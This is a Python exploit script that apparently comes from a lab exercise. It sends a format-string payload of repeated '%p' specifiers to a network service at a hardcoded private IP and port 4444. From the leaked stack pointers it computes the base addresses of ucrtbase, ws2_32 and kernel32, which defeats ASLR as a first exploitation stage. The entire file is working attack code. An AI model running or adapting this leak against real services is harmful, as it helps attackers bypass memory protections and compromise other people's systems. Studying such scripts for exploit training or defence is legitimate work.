#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def getAslrBase():
    numberOfChars = 172
    char = b"%p>"
    buffer = char * numberOfChars
    fileName = 'leaked_adresses_1.txt'

    startLenght = 20
    bufferLenght = numberOfChars * 9 + startLenght

    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address
    s.recv(1024)
    s.send(bytes('C \r\n', 'utf-8'))
    s.recv(1024)
    s.send(buffer + bytes('\r\n', 'utf-8'))
    data = b""

    while(len(data)<bufferLenght):
        data += s.recv(bufferLenght)

    s.send(bytes('n\r\n', 'utf-8')) # evil buffer
    s.close()

    # remove unnecessary line which are send by the server
    string = data.decode("utf-8")
    string = string.replace("Neuer Topic: ", "")
    string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")
    string = string.replace(">", "\r\n")

    # write into the file
    f = open(fileName, "w")
    f.write(string)
    f.close()

    # open the file and put the leaked addresses in an array
    infile = open(fileName, 'r')
    lines = infile.readlines()
    leakedAdresses = []

    for line in lines:
        leakedAdresses.append(line)

    #calculation of ucrtbase base
    offSet_UcrtBase = int('CE76C', 16)
    leakedAdresseUcrtbase = leakedAdresses[27][0:8]
    leakedAdresseUcrtbase_int = int(leakedAdresseUcrtbase, 16)
    baseUcrtBase = hex(leakedAdresseUcrtbase_int - offSet_UcrtBase)


    #calculation of ws2_32 base
    offSet_WS2_32 = int('6C19', 16)
    leakedAdresseWS2_32 = leakedAdresses[0][0:8]
    leakedAdresseWS2_32_int = int(leakedAdresseWS2_32, 16)
    baseWS2_32 = hex(leakedAdresseWS2_32_int - offSet_WS2_32)

    # calculation of kernel32 base
    offSet_Kernel32 = int('4EF6C', 16)
    leakedAdresseKernel32_1 = leakedAdresses[157][0:8]
    leakedAdresseKernel32_2 = leakedAdresses[158][0:8]
    leakedAdresseKernel32_1_int = int(leakedAdresseKernel32_1, 16)
    leakedAdresseKernel32_2_int = int(leakedAdresseKernel32_2, 16)
    baseKernel32_1 = hex(leakedAdresseKernel32_1_int - offSet_Kernel32)
    baseKernel32_2 = hex(leakedAdresseKernel32_2_int - offSet_Kernel32)



    if len(baseKernel32_1) == 10:
        return baseUcrtBase, baseWS2_32, baseKernel32_1
    else:
        return baseUcrtBase, baseWS2_32, baseKernel32_2

def main():
    base_ucrtbase_DLL, base_WS2_32_dll, base_kernel32_dll = getAslrBase()
    print(base_ucrtbase_DLL, base_WS2_32_dll, base_kernel32_dll)

main()